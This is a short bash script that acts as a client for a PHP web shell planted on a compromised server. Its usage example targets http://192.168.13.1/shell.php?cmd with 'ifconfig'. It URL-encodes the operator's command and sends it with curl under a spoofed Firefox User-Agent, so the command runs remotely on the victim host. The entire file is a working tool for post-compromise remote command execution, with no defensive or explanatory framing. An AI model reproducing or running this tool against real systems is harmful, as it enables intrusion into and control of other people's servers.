#!/bin/bash

if [[ $1 == "" ]];then
  echo "Usage: $0 [Shell and parameter Url] [command]"
  echo "Example: $0 http://192.168.13.1/shell.php?cmd ifconfig"
  exit 1;
fi

SHELLURL="$1"
COMMAND="$2"
CURL=$(which curl)
UA="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0"

cmd=$(echo "$COMMAND" |sed 's/ /%20/g')

$CURL -H $UA -G "$SHELLURL=$cmd"